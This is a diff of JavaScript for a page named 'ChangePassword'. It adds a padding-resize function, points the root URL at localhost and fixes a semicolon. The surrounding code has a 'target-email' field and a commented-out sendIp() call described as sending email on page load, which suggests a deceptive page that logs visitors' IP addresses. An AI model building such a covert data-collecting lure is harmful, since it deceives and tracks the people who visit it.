@@ -1,16 +1,33 @@
 let ip = null;
 // ! Switch to live URL
-let rootUrl = "https://gpaphitis.github.io/ChangePassword/cd2feffee199eea9354472021b566af07530d53d";
-// let rootUrl = "http://localhost:5500/cd2feffee199eea9354472021b566af07530d53d";
+// let rootUrl = "https://gpaphitis.github.io/ChangePassword/cd2feffee199eea9354472021b566af07530d53d";
+let rootUrl = "http://localhost:5500/cd2feffee199eea9354472021b566af07530d53d";
 document.addEventListener("DOMContentLoaded", () =>
 {
    document.querySelector("#next").addEventListener("click", submit);
    document.querySelector("#cancel").addEventListener("click", clearForm);
    document.querySelector("#target-email").addEventListener("input", checkValid);
+   window.addEventListener("resize", resizePadding);
    // ! Uncomment to enable email send upon loading of page
    console.log("Sent");
    // sendIp();
 });
+function resizePadding()
+{
+   // Remove previous height first for correct body height calculation
+   let previousStyle = document.querySelector(".added-style");
+   if (previousStyle != null)
+      previousStyle.remove();
+   let body = document.querySelector("body");
+   let contentContainer = document.querySelector("#content");
+   let footer = document.querySelector("footer");
+   let currentPadding = document.querySelector("#padding");
+   let paddingHeight = body.offsetHeight - contentContainer.offsetHeight - footer.offsetHeight + currentPadding.offsetHeight;
+   let element = document.createElement("style");
+   element.classList.add("added-style");
+   element.innerText = `#padding{height:${paddingHeight}px;}`;
+   document.head.appendChild(element);
+}
 function clearForm()
 {
    // Clears all empty field errors
@@ -21,7 +38,7 @@ function clearForm()
       makeInvisible(emptyErrors[i]);
    }
    // Clears specific invalid email error
-   makeInvisible(document.querySelector("#email-error"))
+   makeInvisible(document.querySelector("#email-error"));
 }
 async function getIp()
 {
